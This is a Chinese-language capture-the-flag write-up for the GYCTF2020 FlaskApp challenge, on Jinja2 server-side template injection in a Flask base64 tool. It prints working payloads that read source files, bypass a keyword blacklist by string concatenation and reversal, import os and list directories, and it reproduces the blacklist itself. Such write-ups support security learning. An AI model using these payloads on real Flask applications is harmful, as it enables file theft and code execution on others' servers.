# 原创
：  [GYCTF2020]FlaskApp

# [GYCTF2020]FlaskApp

#### [GYCTF2020]FlaskApp

## 考点

> 
Flask模板注入、waf绕过、ssti注入


## 思路

> 
题目页面是一个模拟base64加解密功能的页面，当我们在decode页面中输入错误信息致使其发生错误时会出现报错页面提示，可以查看到部分代码内容


> 
传text参数，进行解密，如果可以过waf则执行代码，读取源码试试：<br/> `{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}`


> 
从源码中我们可以发现waf过滤的内容，发现flag和os等被过滤


> 
利用字符串拼接找目录：<br/> `{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}`


> 
发现存在 this_is_the_flag.txt文件，读取flag：<br/> `{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}`


## Payload

> 
waf函数


```
def waf(str):
    black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;,
                  &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]
    for x in black_list :
        if x in str.lower() :
            return 1

```

> 
读取源码：<br/> `{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}`


> 
利用字符串拼接找目录：<br/> `{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}`


> 
读取 flag：<br/> `{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}`

